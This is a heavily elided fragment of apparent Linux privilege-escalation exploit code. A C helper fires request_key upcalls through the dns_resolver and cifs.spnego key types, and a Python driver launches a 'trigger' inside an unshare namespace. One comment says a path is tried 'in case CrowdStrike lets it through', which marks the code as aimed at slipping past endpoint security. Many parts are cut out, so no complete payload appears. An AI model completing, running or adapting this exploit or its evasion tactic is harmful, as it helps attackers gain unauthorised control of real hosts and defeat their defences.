...
static long try_request_key(const char *type, const char *desc, const char *ci) {
    long r;
    errno = 0;
    r = syscall(__NR_request_key, type, desc, ci, KEY_SPEC_SESSION_KEYRING);
    fprintf(stderr, "[T] request_key(%s, %s) = %ld e=%d (%s)\n",
...
int main(int ac, char **av) {
    ...
    /* Try dns_resolver first (uses getaddrinfo -> NSS hosts: lookup) */
    try_request_key("dns_resolver", "example.com", "");

    /* Also try cifs.spnego in case CrowdStrike lets it through */
    {
        char desc[768];
        snprintf(desc, sizeof(desc),
                 ...
                 getpid());
        try_request_key("cifs.spnego", desc, "");
    }
...
def main():
    ...
    print("\n[*] running trigger via unshare...", flush=True)
    _run(
